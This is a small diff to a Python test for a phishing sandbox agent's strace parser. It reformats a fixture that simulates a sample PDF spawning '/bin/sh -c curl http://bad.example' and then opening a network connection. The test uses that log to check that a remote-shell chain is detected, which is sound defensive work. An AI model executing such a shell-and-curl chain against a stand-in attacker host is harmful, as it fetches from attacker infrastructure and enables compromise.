@@ -12,14 +12,7 @@ from soc_platform.domains.phishing.engine.agents.sandbox_agent.agent import (
 
 
 def test_extract_behavior_detects_remote_shell_chain() -> None:
-    logs = "\n".join(
-        [
-            '12:00:00 execve("/sandbox/input/sample.pdf", ["sample.pdf"], 0x0) = 0',
-            '12:00:01 execve("/bin/sh", ["sh", "-c", "curl http://bad.example"], 0x0) = 0',
-            '12:00:02 execve("/usr/bin/curl", ["curl", "http://bad.example"], 0x0) = 0',
-            '12:00:03 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("8.8.8.8")}, 16) = 0',
-        ]
-    )
+    logs = '12:00:00 execve("/sandbox/input/sample.pdf", ["sample.pdf"], 0x0) = 0\n12:00:01 execve("/bin/sh", ["sh", "-c", "curl http://bad.example"], 0x0) = 0\n12:00:02 execve("/usr/bin/curl", ["curl", "http://bad.example"], 0x0) = 0\n12:00:03 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("8.8.8.8")}, 16) = 0'
 
     behavior = _extract_behavior_from_strace(logs)
 
